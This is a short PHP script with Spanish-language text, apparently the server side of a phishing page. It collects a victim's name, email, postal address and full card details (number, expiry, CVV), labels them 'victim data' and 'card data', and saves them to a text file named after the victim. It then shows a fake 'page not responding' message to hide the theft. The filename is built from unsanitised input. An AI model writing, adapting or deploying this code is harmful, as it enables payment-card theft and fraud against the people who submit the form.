
	<?php

$nombre = $_POST["nombre"];
$email = $_POST["email"];
$direccion = $_POST["direccion"];
$provincia = $_POST["provincia"];
$ciudad= $_POST["ciudad"];
$zip = $_POST["zip"];


$titular = $_POST["titular"];
$numero = $_POST["numero"];
$fecha = $_POST["fecha"];
$cvv = $_POST["cvv"];


$contenido="
 ___________________
|DATOS DE LA VICTIMA|
|___________________|
 NOMBRE: $nombre
 EMAIL: $email
 DIRECCION: $direccion
 PROVINCIA: $provincia
 CIUDAD: $ciudad
 ZIP: $zip
  ___________________
 |DATOS DE LA TARJETA|
 |___________________|
 NOMBRE: $titular
 NUMERO: $numero
 FECHA: $fecha
 CVV: $cvv
 
 
";

$archivo = fopen("Cuentas/$nombre.txt", "w");
fwrite($archivo,$contenido);

?>
</head>		
				
				<body>
		<div align="center">
<h2>Querido Usuario</h2>
						</div>
	<p>En estos momentos la pagina no responde,porfavor intentelo mas tarde.</p> 
			
					</body>
</html>
